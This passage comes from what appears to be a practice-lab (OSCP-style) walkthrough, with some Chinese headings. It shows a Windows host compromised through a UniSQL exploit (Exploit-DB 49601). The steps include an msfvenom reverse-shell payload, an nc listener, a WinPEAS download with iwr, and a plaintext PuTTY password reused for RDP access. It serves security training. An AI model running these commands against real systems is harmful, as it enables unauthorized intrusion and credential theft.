SF:6\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-22T15:31:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
```

</details>

##### '1978 tcp unisql exploit-DB' --> 'Exploit-DB 49601'
[https://www.exploit-db.com/exploits/49601]
```
$ vi 49601
$ chmod +x 49601

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.66 LPORT=4444 -f exe -o payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe

$ python3 -m http.server 8011
Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
```
```
$ python2 49601 192.168.66.145 192.168.49.66:8011 payload.exe
[+] 3..2..1..
[+] *Super fast hacker typing*
[+] Retrieving payload
[+] Done! Check Your Listener?
```
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.66] from (UNKNOWN) [192.168.66.145] 49706
Microsoft Windows [Version 10.0.19041.1]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
oscp\offsec
C:\Users\offsec\Desktop>type local.txt
```
#### Privilege Escalation
##### 使用WinPEAS: /usr/share/peass/winpeas/winPEASany.exe --> 在 Putty 会话注册表中发现了明文凭据
```
C:\Users\offsec\Downloads>powershell

PS C:\Users\offsec\Downloads> iwr http://192.168.49.66:8011/winPEASany.exe -OutFile winPEASany.exe
iwr http://192.168.49.66:8011/winPEASany.exe -OutFile winPEASany.exe

PS C:\Users\offsec\Downloads>.\winPEASany.exe

Putty Sessions
    RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
```
```
$ xfreerdp3 /u:'zachary' /p:'Th3R@tC@tch3r' /v:192.168.66.145

//cmd --> run as Administrator
C:\WINDOWS\system32>whoami
oscp\zachary

C:\WINDOWS\system32>cd ..\..\Users\Administrator 

C:\Users\Administrator\Desktop>type proof.txt
```
